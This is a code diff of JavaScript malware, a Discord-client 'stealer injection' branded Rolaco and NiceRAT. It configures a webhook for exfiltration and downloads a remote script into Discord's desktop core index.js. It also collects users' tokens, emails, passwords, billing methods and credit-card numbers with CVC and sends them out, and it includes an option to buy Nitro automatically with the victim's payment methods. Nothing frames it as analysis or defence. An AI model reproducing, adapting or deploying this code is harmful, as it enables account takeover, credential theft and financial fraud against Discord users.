@@ -7,15 +7,17 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%',
+  webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone', 
-  embed_name: 'Rolaco Stealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png',
-  embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-clean.js', 
-
+  ping_val: '@everyone',
+  embed_name: 'ROlaco Stealer Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/0x00G/NiceRAT/main/img/Nice.png'.replace(/ /g, '%20'), 
+  embed_color: 2895667, 
+  injection_url: 'https://raw.githubusercontent.com/NiceRAT/injection/main/index.js', 
+  /**
+   
+   **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -412,8 +414,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
-  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -443,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${config.webhook}')
+        res.replace('%WEBHOOK%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -493,23 +494,21 @@ const fetchBilling = async (token) => {
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (!data) return '❌';
-  const billing = [];
+  let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing.push('💳');
+          billing += '💳 ';
           break;
         case 2:
-          billing.push('<:paypal:951139189389410365>');
+          billing += '<:paypal:951139189389410365> ';
           break;
-        default:
-            billing.push('(Unknown)');
       }
     }
   });
-  if (billing.length == 0) billing.push('❌');
-  return billing.join(' ');
+  if (!billing) billing = '❌';
+  return billing;
 };
 
 const Purchase = async (token, id, _type, _time) => {
@@ -572,59 +571,53 @@ const getNitro = (flags) => {
     case 1:
       return 'Nitro Classic';
     case 2:
-      return 'Nitro';
-    case 3:
-      return 'Nitro Basic';
+      return 'Nitro Boost';
     default:
-      return '(Unknown)';
+      return 'No Nitro';
   }
 };
 
 const getBadges = (flags) => {
-  const badges = [];
-  
-  if (flags & (1 << 22)) {
-      badges.push('Active Developer')
+  let badges = '';
+  switch (flags) {
+    case 1:
+      badges += 'Discord Staff, ';
+      break;
+    case 2:
+      badges += 'Partnered Server Owner, ';
+      break;
+    case 131072:
+      badges += 'Verified Bot Developer, ';
+      break;
+    case 4:
+      badges += 'Hypesquad Event, ';
+      break;
+    case 16384:
+      badges += 'Gold BugHunter, ';
+      break;
+    case 8:
+      badges += 'Green BugHunter, ';
+      break;
+    case 512:
+      badges += 'Early Supporter, ';
+      break;
+    case 128:
+      badges += 'HypeSquad Brillance, ';
+      break;
+    case 64:
+      badges += 'HypeSquad Bravery, ';
+      break;
+    case 256:
+      badges += 'HypeSquad Balance, ';
+      break;
+    case 0:
+      badges = 'None';
+      break;
+    default:
+      badges = 'None';
+      break;
   }
-  if (flags & (1 << 18)) {
-      badges.push('Moderator Programs Alumni')
-  }
-  if (flags & (1 << 17)) {
-      badges.push('Early Verified Bot Developer')
-  }
-  if (flags & (1 << 14)) {
-      badges.push('Discord Bug Hunter (Golden)')
-  }
-  if (flags & (1 << 9)) {
-      badges.push('Early Supporter')
-  }
-  if (flags & (1 << 8)) {
-      badges.push('HypeSquad Balance')
-  }
-  if (flags & (1 << 7)) {
-      badges.push('HypeSquad Brilliance')
-  }
-  if (flags & (1 << 6)) {
-      badges.push('HypeSquad Bravery')
-  }
-  if (flags & (1 << 3)) {
-      badges.push('Discord Bug Hunter (Normal)')
-  }
-  if (flags & (1 << 2)) {
-      badges.push('HypeSquad Event')
-  }
-  if (flags & (1 << 1)) {
-      badges.push('Partnered Server Owner')
-  }
-  if (flags & (1 << 0)) {
-      badges.push('Discord Staff')
-  }
-  
-  if (!badges.length) {
-    return "None"
-  } else {
-    return badges.join(', ');
-  }
+  return badges;
 };
 
 const hooker = async (content) => {
@@ -686,6 +679,9 @@ const login = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
+        footer: {
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+        },
       },
     ],
   };
@@ -724,6 +720,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
@@ -764,6 +763,9 @@ const emailChanged = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
+        footer: {
+          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
+        },
       },
     ],
   };
@@ -784,7 +786,7 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**PayPal Added**',
+            name: '**Paypal Added**',
             value: `Time to buy some nitro baby 😩`,
             inline: false,
           },
@@ -802,6 +804,9 @@ const PaypalAdded = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
@@ -841,6 +846,9 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
@@ -882,6 +890,9 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By Rolaco & https://discord.gg/cYmVd6eEm4',
         },
       },
     ],
